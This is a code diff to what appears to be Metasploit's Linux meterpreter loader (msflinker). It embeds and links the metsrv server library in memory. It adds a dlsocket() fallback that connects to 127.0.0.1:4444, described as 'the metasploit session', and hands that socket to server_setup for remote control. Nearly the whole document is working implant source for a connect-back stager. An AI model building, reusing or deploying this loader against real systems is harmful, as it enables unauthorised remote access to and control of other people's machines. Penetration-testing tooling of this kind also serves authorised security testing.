@@ -9,6 +9,13 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <dlfcn.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <endian.h>
 
 #include "linker.h"
 #include "linker_debug.h"
@@ -19,7 +26,7 @@
 #include "libcrypto.h"
 #include "libssl.h"
 #include "libsupport.h"
-#include "metsrv_main.h"
+#include "libmetsrv_main.h"
 
 struct libs {
 	char *name;
@@ -34,7 +41,7 @@ static struct libs libs[] = {
 	{ "libcrypto.so.0.9.8", libcrypto, libcrypto_length, NULL },
 	{ "libssl.so.0.9.8", libssl, libssl_length, NULL },
 	{ "libsupport.so", libsupport, libsupport_length, NULL },
-	{ "metsrv_main", metsrv_main, metsrv_main_length, NULL },
+	{ "libmetsrv_main.so", libmetsrv_main, libmetsrv_main_length, NULL },
 };
 
 #define LIBC_IDX 0
@@ -46,13 +53,16 @@ static struct libs libs[] = {
  * that's what the API has.
  */
 
-unsigned metsrv_rtld(int fd, void *base)
+int dlsocket(void *libc);
+
+unsigned metsrv_rtld(int fd)
 {
 	int i;
 	int (*libc_init_common)();
 	int (*server_setup)();
+	struct stat statbuf;
 
-	INFO("[ preparing to link. base @ %08x, and fd = %d ]\n", base, fd);
+	INFO("[ preparing to link. fd = %d ]\n", fd);
 
 	for(i = 0; i < sizeof(libs) / sizeof(struct libs); i++) {
 		libs[i].handle = (void *) dlopenbuf(libs[i].name, libs[i].buf, libs[i].size);
@@ -66,12 +76,59 @@ unsigned metsrv_rtld(int fd, void *base)
 	TRACE("[ __libc_init_common is at %08x, calling ]\n", libc_init_common);
 	libc_init_common();
 
+	if(fstat(fd, &statbuf) == -1) {
+		TRACE("[ supplied fd fails fstat() check, using dlsocket() ]\n");
+		fd = dlsocket(libs[LIBC_IDX].handle);
+		if(fd == -1) {
+			TRACE("[ failed to dlsocket() a connection. exit()ing ]\n");
+			exit(-1);
+		}
+	}
+
 	server_setup = dlsym(libs[METSRV_IDX].handle, "server_setup");
 	TRACE("[ metsrv server_setup is at %08x, calling ]\n", server_setup);
 	server_setup(fd);
 
 	TRACE("[ metsrv_rtld(): server_setup() returned, exit()'ing ]\n");
 	exit(1);
+}
+
+/*
+ * If we have been executed directly (instead of staging shellcode / 
+ * rtldtest binary, we will have an invalid fd passed in. Here we 
+ * use the libc symbols to connect to the metasploit session
+ */
+
+int dlsocket(void *libc)
+{
+	int retcode = -1;
+	int fd;
+	int (*libc_socket)();
+	int (*libc_connect)();
+	int (*libc_inet_addr)();
+	struct sockaddr_in sin;
+	
+	libc_socket = dlsym(libc, "socket");
+	libc_connect = dlsym(libc, "connect");
+	libc_inet_addr = dlsym(libc, "inet_addr");
+
+	memset(&sin, 0, sizeof(struct sockaddr_in));
+
+	do {
+		fd = libc_socket(AF_INET, SOCK_STREAM, 0);
+		if(fd == -1) break;
+
+		sin.sin_addr.s_addr = libc_inet_addr("127.0.0.1");
+		sin.sin_port = htons(4444);
+		sin.sin_family = AF_INET;
+
+		if(libc_connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) break;
+		retcode = fd;
+
+	} while(0);
+
+	return retcode;
+
 }
 
 /* 
@@ -81,8 +138,16 @@ unsigned metsrv_rtld(int fd, void *base)
  *
  */
 
-void _start()
+void sigchld(int signo)
 {
-	// meh, use bash.
-	metsrv_rtld(5, NULL);
+	waitpid(-1, NULL, WNOHANG);
+}
+
+void _start(int fd)
+{
+	signal(SIGCHLD, sigchld);
+	signal(SIGPIPE, SIG_IGN);
+
+	// we can't run ./msflinker directly. Use rtldtest to test the code 
+	metsrv_rtld(fd);
 }
